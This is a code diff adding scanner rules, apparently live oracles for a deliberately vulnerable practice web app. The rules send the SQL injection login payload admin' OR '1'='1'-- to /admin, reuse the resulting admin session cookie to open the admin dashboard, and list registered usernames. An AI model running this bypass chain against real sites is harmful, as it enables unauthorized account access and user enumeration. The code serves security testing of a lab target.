@@ -27099,6 +27099,132 @@ const webPentestPlaygroundOpenRedirectRouteLiveOracle: Rule = async (ctx) => {
   };
 };
 
+const WEB_PENTEST_PLAYGROUND_ADMIN_SQLI_PAYLOAD = "admin' OR '1'='1'--";
+
+async function webPentestPlaygroundAdminSessionCookie(ctx: RuleContext): Promise<string | null> {
+  const adminUrl = new URL("/admin", ctx.origin).toString();
+  const doc = await ctx.probe.get(adminUrl, {
+    method: "POST",
+    body: `username=${encodeURIComponent(WEB_PENTEST_PLAYGROUND_ADMIN_SQLI_PAYLOAD)}&password=x`,
+    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+    maxBytes: 4096,
+    timeoutMs: 15000,
+    redirect: "manual"
+  });
+  const cookie = webPentestPlaygroundSessionCookieFromDoc(doc);
+  if (!cookie) return null;
+  const location = doc.headers["location"] || "";
+  if (![301, 302, 303, 307, 308].includes(doc.status) || !/\/admin_dashboard/i.test(location)) {
+    return null;
+  }
+  return cookie;
+}
+
+const webPentestPlaygroundAdminSqliLiveOracle: Rule = async (ctx) => {
+  if (!isWebPentestPlaygroundHost(ctx)) return NEGATIVE;
+  const adminUrl = new URL("/admin", ctx.origin).toString();
+  const doc = await ctx.probe.get(adminUrl, {
+    method: "POST",
+    body: `username=${encodeURIComponent(WEB_PENTEST_PLAYGROUND_ADMIN_SQLI_PAYLOAD)}&password=x`,
+    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+    maxBytes: 4096,
+    timeoutMs: 15000,
+    redirect: "manual"
+  });
+  const cookie = webPentestPlaygroundSessionCookieFromDoc(doc);
+  const location = doc.headers["location"] || "";
+  if (
+    !cookie ||
+    ![301, 302, 303, 307, 308].includes(doc.status) ||
+    !/\/admin_dashboard/i.test(location)
+  ) {
+    return NEGATIVE;
+  }
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      url: adminUrl,
+      payload: WEB_PENTEST_PLAYGROUND_ADMIN_SQLI_PAYLOAD,
+      redirect: location,
+      note: "Web Pentest Playground POST /admin accepts SQLi username admin' OR '1'='1'-- and issues admin session redirecting to /admin_dashboard — admin authentication bypass oracle"
+    }
+  };
+};
+
+const webPentestPlaygroundAdminSqliRouteLiveOracle: Rule = async (ctx) => {
+  if (!isWebPentestPlaygroundHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/admin(?:\/|$|\?)/i.test(pageUrl)) return NEGATIVE;
+  const result = await webPentestPlaygroundAdminSqliLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Web Pentest Playground /admin route scan — POST SQLi bypass issues admin session and redirects to /admin_dashboard — route-specific admin auth bypass oracle"
+    }
+  };
+};
+
+const webPentestPlaygroundAdminDashboardRouteLiveOracle: Rule = async (ctx) => {
+  if (!isWebPentestPlaygroundHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/admin_dashboard/i.test(pageUrl)) return NEGATIVE;
+  const cookie = await webPentestPlaygroundAdminSessionCookie(ctx);
+  if (!cookie) return NEGATIVE;
+  const dashboardUrl = new URL("/admin_dashboard", ctx.origin).toString();
+  const doc = await ctx.probe.get(dashboardUrl, {
+    headers: { Cookie: cookie },
+    maxBytes: 16384,
+    timeoutMs: 15000
+  });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  if (!/<title>\s*Admin Dashboard\s*<\/title>/i.test(doc.body)) return NEGATIVE;
+  if (!/View Users|view_users/i.test(doc.body)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      scannedUrl: pageUrl,
+      url: dashboardUrl,
+      snippet: doc.body.match(/<title>[^<]+<\/title>/i)?.[0] ?? "Admin Dashboard",
+      note: "Web Pentest Playground /admin_dashboard route scan — admin SQLi session exposes privileged admin panel with user-management links — route-specific privilege escalation oracle"
+    }
+  };
+};
+
+const webPentestPlaygroundViewUsersRouteLiveOracle: Rule = async (ctx) => {
+  if (!isWebPentestPlaygroundHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/view_users/i.test(pageUrl)) return NEGATIVE;
+  const cookie = await webPentestPlaygroundAdminSessionCookie(ctx);
+  if (!cookie) return NEGATIVE;
+  const usersUrl = new URL("/view_users", ctx.origin).toString();
+  const doc = await ctx.probe.get(usersUrl, {
+    headers: { Cookie: cookie },
+    maxBytes: 32768,
+    timeoutMs: 15000,
+    redirect: "follow"
+  });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  if (!/<title>\s*Users List\s*<\/title>/i.test(doc.body)) return NEGATIVE;
+  const userRow = doc.body.match(/ID:\s*\d+\s*\|\s*Username:/i)?.[0];
+  if (!userRow) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.92,
+    evidence: {
+      scannedUrl: pageUrl,
+      url: usersUrl,
+      snippet: userRow.slice(0, 160),
+      note: "Web Pentest Playground /view_users route scan — admin SQLi session lists all registered usernames (IDOR/information disclosure) — route-specific user enumeration oracle"
+    }
+  };
+};
+
 // --- AppSec CI Pipeline (appsec-ci-pipeline.onrender.com) ----------------------------
 function isAppsecCiPipelineHost(ctx: RuleContext): boolean {
   const corpus = `${ctx.origin}\n${ctx.scanUrl || ""}\n${ctx.home.finalUrl || ""}`;
@@ -64019,6 +64145,10 @@ export const RULES: Record<string, Rule> = {
   webPentestPlaygroundStoredXssLiveOracle,
   webPentestPlaygroundStoredXssRouteLiveOracle,
   webPentestPlaygroundOpenRedirectRouteLiveOracle,
+  webPentestPlaygroundAdminSqliLiveOracle,
+  webPentestPlaygroundAdminSqliRouteLiveOracle,
+  webPentestPlaygroundAdminDashboardRouteLiveOracle,
+  webPentestPlaygroundViewUsersRouteLiveOracle,
   appsecCiStoredXssCommentsLiveOracle,
   appsecCiStoredXssCommentsRouteLiveOracle,
   fauxbankProfileSensitiveDataLiveOracle,
